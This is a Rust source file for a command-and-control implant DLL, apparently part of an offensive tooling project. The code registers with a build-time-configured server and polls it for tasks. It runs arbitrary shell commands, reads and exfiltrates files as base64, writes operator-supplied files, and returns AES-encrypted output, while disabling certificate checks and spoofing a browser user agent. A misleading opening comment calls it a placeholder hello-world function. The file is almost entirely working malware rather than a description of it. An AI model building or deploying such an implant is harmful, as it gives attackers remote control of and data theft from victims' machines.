// make a placeholder hellow world function called Pick
#![allow(unreachable_code)]

use openssl::symm::{Cipher, Crypter, Mode};

use serde::{Deserialize, Serialize};
use std::fs::File;
use std::io::{Read, Write};
//use std::ffi::CString;
use base64::{
    alphabet,
    engine::{self, general_purpose},
    Engine as _,
};

use reqwest::blocking::Client;
use reqwest::header;
use std::process::Command;
use std::thread::sleep;

#[derive(Serialize, Deserialize, Debug)]
pub struct ImpInfo {
    pub session: String,
    pub ip: String,
    pub username: String,
    pub domain: String,
    pub os: String,
    pub imp_pid: String,
    pub process_name: String,
    pub sleep: String,
}

#[derive(Serialize, Deserialize, Debug)]
struct OutputData {
    session: String,
    task_name: String,
    output: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct SleepTime {
    sleep: String,
}

#[no_mangle]
pub extern "system" fn Pick() {
    //setup our struct with the info we want to send to the server
    let imp_info = ImpInfo {
        session: env!("UUID").to_string(), //grabs the UUID from the environment used to build the implant
        ip: get_external_ip(),        //replace with real get_external_ip function
        username: get_username(),          //get the username
        //hardcode domain for now as TODO
        domain: "TODO".to_string(),
        os: get_version(),  //get the os version
        imp_pid: get_pid(), //get the process id
        process_name: get_process_name(),
        //sleep: SLEEP.to_string(), //have this pull the actual value later
        sleep: env!("SLEEP").to_string(), //grabs the SLEEP from the environment used to build the implant
    };

    //call our function to send the request
    send_request(imp_info);

    //since we are using a dll, we need to try to keep all our functions that are called by pick, inside of pick, to avoid issues with sRDI, which requires all functions to have the same prototypes, unless defined and called within our exported function (pick)

    fn read_and_encode(args: Vec<&str>) -> String {
        const CUSTOM_ENGINE: engine::GeneralPurpose =
            engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD);
        let mut file_path = "";
        if args.len() > 1 {
            file_path = args[1];
        }
        let mut file = match File::open(file_path) {
            Ok(file) => file,
            Err(e) => return format!("Error opening file: {}", e),
        };
        let mut buffer = Vec::new();
        if let Err(e) = file.read_to_end(&mut buffer) {
            return format!("Error reading file: {}", e);
        }
        let content = CUSTOM_ENGINE.encode(&buffer);

        content
    }

    fn read_and_decode(args: Vec<&str>) -> String {
        const CUSTOM_ENGINE: engine::GeneralPurpose =
            engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD);
        let mut file_path = "";
        if args.len() > 1 {
            file_path = args[1];
        }

        //get just the file name by splitting the file path on the \ character and taking the last element
        let file_name = file_path.split('\\').last().unwrap();

        //the base64 encoded string of binary data is the 3rd string in the args array
        let encoded_content = args[2];
        //decode the base64 encoded string of binary data
        let buffer = CUSTOM_ENGINE.decode(encoded_content.as_bytes());
        //let content = CUSTOM_ENGINE.decode(&buffer);
        //write the decoded binary data to a file
        let mut file = match File::create(file_name) {
            Ok(file) => file,
            Err(e) => return format!("Error creating file: {}", e),
        };
        //convert the buffer from a Result to a Vec<u8>
        let buffer = match buffer {
            Ok(buffer) => buffer,
            Err(e) => return format!("Error decoding file: {}", e),
        };
        //write the buffer to the file
        if let Err(e) = file.write_all(&buffer) {
            return format!("Error writing file: {}", e);
        }

        //return a string that says the file was written successful

        let content = "File written successfully".to_string();

        content
    }

    fn get_process_name() -> String {
        // Open the /proc/self/status file
        match File::open("/proc/self/status") {
            // If the file opens successfully, read the contents and get the process name
            Ok(mut file) => {
                let mut contents = String::new();
                // Handle possible errors here
                if let Err(e) = file.read_to_string(&mut contents) {
                    return format!("Error reading file: {}", e);
                }

                // Split the contents into lines and iterate over them
                for line in contents.lines() {
                    // If the line starts with "Name:", split the line into words and take the last word
                    if line.starts_with("Name:") {
                        return line.split_whitespace().last().unwrap().to_string();
                    }
                }
            }
            // If the file fails to open, return "Unknown"
            Err(_) => {}
        }

        // If we reach here, it means we couldn't find the process name
        "Unknown".to_string()
    }

    fn get_pid() -> String {
        // Open the /proc/self/status file
        match File::open("/proc/self/status") {
            // If the file opens successfully, read the contents and get the process id
            Ok(mut file) => {
                let mut contents = String::new();
                // Handle possible errors here
                if let Err(e) = file.read_to_string(&mut contents) {
                    return format!("Error reading file: {}", e);
                }

                // Split the contents into lines and iterate over them
                for line in contents.lines() {
                    // If the line starts with "Pid:", split the line into words and take the last word
                    if line.starts_with("Pid:") {
                        return line.split_whitespace().last().unwrap().to_string();
                    }
                }
            }
            // If the file fails to open, return "Unknown"
            Err(_) => {}
        }

        // If we reach here, it means we couldn't find the process id
        "Unknown".to_string()
    }

    fn get_version() -> String {
        // Open the /proc/version file
        match File::open("/proc/version") {
            // If the file opens successfully, read the contents and get the OS version
            Ok(mut file) => {
                let mut contents = String::new();
                // Handle possible errors here
                if let Err(e) = file.read_to_string(&mut contents) {
                    return format!("Error reading file: {}", e);
                }

                // Get the OS version
                let version = contents.split_whitespace().nth(2).unwrap().to_string();

                // Check if version contains "WSL" or "WSL2"
                // If it does, change version to "linux WSL" or "linux WSL2"
                if version.contains("WSL") {
                    if version.contains("WSL2") {
                        return "linux WSL2".to_string();
                    } else {
                        return "linux WSL".to_string();
                    }
                }

                version
            }
            // If the file fails to open, return "Unknown"
            Err(_) => "Unknown".to_string(),
        }
    }

    fn get_hostname() -> String {
        // Open the /proc/sys/kernel/hostname file
        match File::open("/proc/sys/kernel/hostname") {
            // If the file opens successfully, read the contents and get the hostname
            Ok(mut file) => {
                let mut contents = String::new();
                // Handle possible errors here
                if let Err(e) = file.read_to_string(&mut contents) {
                    return format!("Error reading file: {}", e);
                }

                // Return the hostname
                return contents.trim().to_string();
            }
            // If the file fails to open, return "Unknown"
            Err(_) => "Unknown".to_string(),
        }
    }

    fn get_username() -> String {
        //get the username on linux with the id -nu command
        //this will return the username of the user that the implant is running as
        //we'll use Command::new to run the id -nu command and capture the output
        //Command new is in the std::process module
        let output = Command::new("id").arg("-nu").output();
        //match the output
        let mut username = match output {
            //if the command is successful, return the username
            Ok(output) => {
                //convert the output to a string and trim whitespace
                let username = String::from_utf8_lossy(&output.stdout);
                username.trim().to_string()
            }
            //if the command fails, return "Unknown"
            Err(_) => "Unknown".to_string(),
        };
        //get hostname
        let hostname = get_hostname();

        //format username with hostname like hostname/username
        let username = format!("{}/{}", hostname, username);
        //return the username
        username
    }

    fn fake_get_external_ip() -> String {
        //this is a fake function to test the send_request function
        //its purpose is to return a fake ip address, so i can share gifs of the implant working without doxxing myself
        //it will be replaced with the real get_external_ip function when we are ready to test the implant
        String::from("xxx.xxx.xxx.xxx") //replace with real ip
    }
    
    fn get_external_ip() -> String {
        //get the external ip address
        //on linux, we can get the external ip address by making a request to a website that returns the ip address of the client
        //we will use the ipify api to get the external ip address
        let response = reqwest::blocking::get("https://api.ipify.org");
        let ip = match response {
            Ok(mut response) => {
                let body = response.text();
                match body {
                    Ok(body) => body,
                    Err(_) => "Unknown".to_string(),
                }
            }
            Err(_) => "Unknown".to_string(),
        };
        ip
    }
    
    // Function to run tasks
    fn run_tasks(tasks: String) -> String {
        let mut output = String::new();

        //split the tasks on the comma
        for task in tasks.split(',') {
            //print the task for debug
            //println!("[run_tasks] Received task: {}", task);
            //split arguments
            let arg_split = task.split(' ');
            //collect the arguments into a vector
            let args = arg_split.collect::<Vec<&str>>();
            //match the args[0] to the task name
            match args[0] {
                //if the task name is "whoami", execute the whoami function
                "whoami" => {
                    output.push_str(&execute_whoami());
                }
                //if the task name is "cd", execute the cd function
                "cd" => {
                    output.push_str(&cd(args));
                }
                //if the task name is "pwd", execute the pwd function
                "pwd" => {
                    output.push_str(&pwd());
                }
                //if the task name is "ls", execute the ls function
                "ls" => {
                    output.push_str(&ls(args));
                }
                //if the task name is "catfile", execute the catfile function
                "catfile" => {
                    output.push_str(&catfile(args));
                }
                //add a function to "upload" files to server as base64 encoded strings of binary data
                "getfile" => {
                    output.push_str(&read_and_encode(args));
                }
                //add a function to "download" files from server as base64 encoded strings of binary data
                "sendfile" => {
                    output.push_str(&read_and_decode(args));
                }
                //add new tasks here
                //sh or shell will be used to execute shell commands
                "sh" | "shell" => {
                    //execute the shell function
                    //this will execute the command in the linux shell
                    //and return the output
                    output.push_str(&shell(args));
                }
                "kill" => {
                    //kill the implant
                    output.push_str("Killing the implant");
                    kill();
                }
                _ => {
                    //if the task name is unknown, return an error
                    //println!("[run_tasks] Unknown task: {}", task);
                    output.push_str(&format!("Unknown task: {}\n", task));
                }
            }
        }

        //return the output
        output
    }

    fn kill() -> ! {
        std::process::exit(0);
    }

    fn execute_whoami() -> String {
        let output = Command::new("whoami")
            .output()
            .expect("Failed to execute command");
        let output = String::from_utf8_lossy(&output.stdout);
        output.to_string()
    }

    fn cd(args: Vec<&str>) -> String {
        let mut directory = ".";
        if args.len() > 1 {
            directory = args[1];
        }

        let read = std::env::set_current_dir(directory);
        if read.is_ok() {
            return String::from(format!("Changed directory to: {:?}", directory));
        } else {
            return String::from(format!(
                "Could not change directory: {:?}",
                read.err().unwrap()
            ));
        }
    }

    fn pwd() -> String {
        let read = std::env::current_dir();
        if read.is_ok() {
            return String::from(format!("Current directory: {:?}", read.unwrap().display()));
        } else {
            return String::from(format!(
                "Could not get current directory: {:?}",
                read.err().unwrap()
            ));
        }
    }

    fn ls(args: Vec<&str>) -> String {
        //check for the directory to list
        //if there is nothing in args[1], then set it to a period
        //which will list the current directory

        let output = if args.len() < 2 {
            //if there is no directory to list, list the current directory
            Command::new("ls")
                .arg(".")
                .output()
                .expect("Failed to execute command")
        } else {
            //if there is a directory to list
            Command::new("ls")
                .arg(args[1])
                .output()
                .expect("Failed to execute command")
        };

        let output = String::from_utf8_lossy(&output.stdout);
        output.to_string()
    }

    fn catfile(args: Vec<&str>) -> String {
        let mut file = "";
        if args.len() > 1 {
            file = args[1];
        }
        let read = std::fs::read_to_string(file);
        if read.is_ok() {
            return read.unwrap();
        } else {
            return String::from(format!("Could not read file: {:?}", read.err().unwrap()));
        }
    }

    fn shell(args: Vec<&str>) -> String {
        //capture the command from the args, which is in the 2nd position
        if args.len() > 1 {
            //if the command is more than one word, we need to join the args into a single string
            let command = args[1..].join(" ");
            // execute the command in linux shell
            match Command::new("sh").arg("-c").arg(&command).output() {
                Ok(output) => {
                    if !output.stderr.is_empty() {
                        //if command fails, return the error
                        String::from_utf8_lossy(&output.stderr).to_string()
                    } else {
                        //if command is successful, return the output
                        String::from_utf8_lossy(&output.stdout).to_string()
                    }
                }
                Err(_) => {
                    //if command fails to execute, return the error
                    String::from("Command failed to execute")
                }
            }
        } else {
            String::from("No command provided")
        }
    }
    // Function to send request
    // This is actually the main operations of the implant
    // It performs initial registration, checkins, task retrieval and task execution
    fn send_request(imp_info: ImpInfo) {
        // Outer loop to ensure the implant keeps running
        loop {
            // Unsafe operation
            //println!("{:?}", imp_info); // Debug - print the imp_info struct

            // Set the server name, port and user agent
            let _jitter = env!("JITTER").to_string(); //in testing this is 0
            let server_name = env!("SERVER").to_string(); //in testing this is 127.0.0.1
            let port = env!("PORT").to_string(); //in testing this is 443
            let user_agent = "Mozilla/5.0".to_string(); // in production this will select from a list of user agents at random

            // Set the endpoints
            let checkin_endpoint = "/js"; //registration endpoint
            let index_endpoint = "/index"; //task retrieval endpoint
            let return_out_endpoint = "/return_out"; //output return endpoint

            // Set the URLs
            //checkin_url is the url to send the initial registration request
            let checkin_url = format!("https://{}:{}{}", server_name, port, checkin_endpoint);
            //println!("checkin_url: {}", checkin_url);
            //index_url is the url to retrieve tasks and continue checking in
            let index_url = format!("https://{}:{}{}", server_name, port, index_endpoint);
            //return_out_url is the url to send the output of the tasks back to the server
            let return_out_url = format!("https://{}:{}{}", server_name, port, return_out_endpoint);

            // Serialize the imp_info struct to JSON
            //let json = serde_json::to_string(&imp_info).unwrap();
            //print for debug
            //println!("imp_info.session: {}", &imp_info.session);

            //add AES encryption here
            let serialized_data =
                serde_json::to_string(&imp_info).expect("Failed to serialize output data");

            // Load the public key from the environment variable
            let encoded_aes_key = env!("AES_KEY");

            //base64 decode the aes key

            let aes_key = decode(encoded_aes_key).expect("Failed to decode AES key");
            //let aes_key_bytes = aes_key.as_bytes();

            // Initialize the AES encryption
            let cipher = Cipher::aes_256_cbc();
            let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should be random in real use cases
            let mut crypter = Crypter::new(cipher, Mode::Encrypt, &aes_key, Some(&iv))
                .expect("Failed to create Crypter");

            // Encrypt the data
            let mut encrypted_data = vec![0; serialized_data.len() + cipher.block_size()];
            let mut count = crypter
                .update(serialized_data.as_bytes(), &mut encrypted_data)
                .expect("Failed to encrypt data");
            count += crypter
                .finalize(&mut encrypted_data[count..])
                .expect("Failed to finalize encryption");

            // Truncate to the actual size of the encrypted data
            encrypted_data.truncate(count);

            let iv_clone = iv.clone();
            let encrypted_data_clone = encrypted_data.clone();

            // Print debug information
            //println!("IV: {:?}", iv_clone);
            //println!("Encrypted data length: {}", encrypted_data.len());
            //println!("Encrypted data: {:?}", encrypted_data_clone);

            // Base64 encode the encrypted data
            let base64_encrypted_data = encode(&encrypted_data);

            // Convert the encrypted data to a String
            let request_body = String::from(base64_encrypted_data);

            // Create an https reqwest client
            let client = Client::builder()
                // This is needed to accept invalid certs. Remove it in production
                // We are using it here to test with self-signed certs
                .danger_accept_invalid_certs(true)
                .build()
                .unwrap();

            // send the checkin request and capture the response in checkin_response
            let checkin_response = client
                // post method to our checkin_url
                .post(&checkin_url)
                // set the headers to send our session id for registration
                .header("X-Unique-Identifier", &imp_info.session)
                .header("Content-Type", "text/plain") // Update Content-Type to text/plain
                // send the string data
                .body(request_body) // Assuming request_body is the string you want to send
                .send();

            //match the checkin_response
            // if the response is Ok, capture the response body, which contains our new session token
            if let Ok(response) = checkin_response {
                let imp_token = response.text().unwrap().trim_matches('"').to_string();
                //println!("imp_token: {}", imp_token);

                // Check if the token is empty
                // If it is, sleep for a while and go back to the start of the outer loop
                if imp_token.is_empty() {
                    //sleep for the duration specified in the imp_info struct
                    sleep(std::time::Duration::from_secs(
                        imp_info.sleep.parse::<u64>().unwrap(),
                    ));
                    continue; // Go back to the start of the outer loop if token is empty
                }

                // Loop for retrying from the index_endpoint
                loop {
                    let sleep_time = SleepTime {
                        sleep: imp_info.sleep.clone(),
                    };

                    //            let json = serde_json::to_string(&imp_info).unwrap();
                    //let json = serde_json::to_string(&sleep_time).unwrap();
                    let serialized_data = serde_json::to_string(&sleep_time)
                    .expect("Failed to serialize output data");

                // Load the public key from the environment variable
                let encoded_aes_key = env!("AES_KEY");

                //base64 decode the aes key

                let aes_key =
                    decode(encoded_aes_key).expect("Failed to decode AES key");
                //let aes_key_bytes = aes_key.as_bytes();

                // Initialize the AES encryption
                let cipher = Cipher::aes_256_cbc();
                let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should be random in real use cases
                let mut crypter =
                    Crypter::new(cipher, Mode::Encrypt, &aes_key, Some(&iv))
                        .expect("Failed to create Crypter");

                // Encrypt the data
                let mut encrypted_data =
                    vec![0; serialized_data.len() + cipher.block_size()];
                let mut count = crypter
                    .update(serialized_data.as_bytes(), &mut encrypted_data)
                    .expect("Failed to encrypt data");
                count += crypter
                    .finalize(&mut encrypted_data[count..])
                    .expect("Failed to finalize encryption");

                // Truncate to the actual size of the encrypted data
                encrypted_data.truncate(count);

                let iv_clone = iv.clone();
                let encrypted_data_clone = encrypted_data.clone();

                // Print debug information
                //println!("IV: {:?}", iv_clone);
                //println!("Encrypted data length: {}", encrypted_data.len());
                //println!("Encrypted data: {:?}", encrypted_data_clone);

                // Base64 encode the encrypted data
                let base64_encrypted_data = encode(&encrypted_data);

                // Convert the encrypted data to a String
                let request_body = String::from(base64_encrypted_data);

                    //need to add encryption to this request to hide our Sleep: X schema

                    // Send the index request and capture the response in index_response
                    // This is where the implant retrieves tasks and continues checking in
                    let index_response = client
                        .post(&index_url)
                        .header("X-Session", &imp_token)
                        .header("User-Agent", &user_agent)
                        .header("Content-Type", "text/plain") // Update Content-Type to text/plain
                        // send the string data
                        .body(request_body) // Assuming request_body is the string you want to send
                        .send();

                    //match the index_response, which is the response from the server
                    match index_response {
                        //if the response is Ok, capture the response body, which contains our tasks
                        Ok(response) => {
                            //capture the response body, which contains our tasks
                            let tasks = response
                                .text()
                                .unwrap()
                                .chars()
                                //filter out non-alphabetic characters and keep spaces
                                .filter(|c| c.is_alphabetic() || *c == ' ')
                                .collect::<String>();
                            //print the tasks for debug
                            //println!("tasks: {}", tasks);

                            //if tasks is empty, sleep for the duration specified in the imp_info struct
                            if tasks.is_empty() {
                                sleep(std::time::Duration::from_secs(
                                    imp_info.sleep.parse::<u64>().unwrap(),
                                ));
                                continue; // This will repeat the loop for index_endpoint
                            }

                            // Run the tasks and capture the output
                            //run_tasks is a function that takes a string of tasks and returns a string of output
                            let output = run_tasks(tasks.clone());

                            // Create an OutputData struct
                            let output_data = OutputData {
                                session: imp_token.clone(),
                                task_name: tasks.clone(),
                                output: output.clone(),
                            };
                            //print for debug
                            //println!("output: {}", output);
                            //println!("output_data: {:?}", output_data);

                            // Serialize the output_data struct to JSON
                            //let json = serde_json::to_string(&output_data).unwrap();
                            //println!("json: {}", json);

                            let serialized_data = serde_json::to_string(&output_data)
                                .expect("Failed to serialize output data");

                            // Load the public key from the environment variable
                            let encoded_aes_key = env!("AES_KEY");

                            //base64 decode the aes key

                            let aes_key =
                                decode(encoded_aes_key).expect("Failed to decode AES key");
                            //let aes_key_bytes = aes_key.as_bytes();

                            // Initialize the AES encryption
                            let cipher = Cipher::aes_256_cbc();
                            let iv = vec![0; cipher.iv_len().unwrap()]; // Initialization vector (IV) - should be random in real use cases
                            let mut crypter =
                                Crypter::new(cipher, Mode::Encrypt, &aes_key, Some(&iv))
                                    .expect("Failed to create Crypter");

                            // Encrypt the data
                            let mut encrypted_data =
                                vec![0; serialized_data.len() + cipher.block_size()];
                            let mut count = crypter
                                .update(serialized_data.as_bytes(), &mut encrypted_data)
                                .expect("Failed to encrypt data");
                            count += crypter
                                .finalize(&mut encrypted_data[count..])
                                .expect("Failed to finalize encryption");

                            // Truncate to the actual size of the encrypted data
                            encrypted_data.truncate(count);

                            let iv_clone = iv.clone();
                            let encrypted_data_clone = encrypted_data.clone();

                            // Print debug information
                            //println!("IV: {:?}", iv_clone);
                            //println!("Encrypted data length: {}", encrypted_data.len());
                            //println!("Encrypted data: {:?}", encrypted_data_clone);

                            // Base64 encode the encrypted data
                            let base64_encrypted_data = encode(&encrypted_data);

                            // Convert the encrypted data to a String
                            let request_body = String::from(base64_encrypted_data);

                            // Send the return_out request
                            let return_out_response = client
                                .post(&return_out_url)
                                .header("X-Session", &imp_token)
                                .header("Content-Type", "text/plain") // Update Content-Type to text/plain
                                // send the string data
                                .body(request_body) // Assuming request_body is the string you want to send
                                .send();

                            //match the return_out_response
                            match return_out_response {
                                //if the response is Ok, print "We Made it." for debug
                                Ok(_) => {
                                    //
                                    //println!("We Made it.");
                                    //sleep for the duration specified in the imp_info struct
                                    sleep(std::time::Duration::from_secs(
                                        imp_info.sleep.parse::<u64>().unwrap(),
                                    ));
                                    continue; // This will repeat the loop for index_endpoint
                                }
                                //if the response is an error, sleep and continue
                                Err(e) => {
                                    //print the error for debug
                                    //println!("Return out error: {:?}", e),
                                    //sleep for the duration specified in the imp_info struct
                                    sleep(std::time::Duration::from_secs(
                                        imp_info.sleep.parse::<u64>().unwrap(),
                                    ));
                                    continue; // This will repeat the loop for index_endpoint
                                }
                                //println!("Return out error: {:?}", e),
                            }
                        }
                        //if the response is an error, print the error for debug
                        Err(e) => {
                            //print the error for debug
                            //println!("Index error: {:?}", e);
                            //sleep for the duration specified in the imp_info struct
                            sleep(std::time::Duration::from_secs(
                                imp_info.sleep.parse::<u64>().unwrap(),
                            ));
                            continue; // This ensures retry after sleep
                        }
                    }
                    break; // Exit the loop if you reach this point (adjust as needed)
                }
            } else {
                //if the response is an error, print the error for debug
                //println!("Checkin error: {:?}", checkin_response.unwrap_err());
                sleep(std::time::Duration::from_secs(
                    imp_info.sleep.parse::<u64>().unwrap(),
                ));
                continue; // If checkin fails, retry after sleep
            }
            break; // You might want to adjust this break according to how you wish to end the outer loop
        }
    }
}

pub fn encode(data: &[u8]) -> String {
    // Define a custom encoding engine using the URL-safe alphabet and no padding.
    const CUSTOM_ENGINE: engine::GeneralPurpose =
    engine::GeneralPurpose::new(&alphabet::URL_SAFE, general_purpose::NO_PAD);

    // Encode the data using the custom encoding engine.
    let content = CUSTOM_ENGINE.encode(data);

    // Return the encoded content.
    content

}

pub fn decode(data: &str) -> Result<Vec<u8>, String> {
// Define a custom encoding engine using the URL-safe alphabet and no padding.
const CUSTOM_ENGINE: engine::GeneralPurpose =
    engine::GeneralPurpose::new(&alphabet::URL_SAFE, engine::general_purpose::NO_PAD);

// Decode the data using the custom encoding engine.
let content_res = CUSTOM_ENGINE.decode(data);

// Handle the result and return the decoded content or an error.
match content_res {
    Ok(content) => Ok(content),
    Err(e) => Err(format!("Error decoding data: {}", e)),
}
}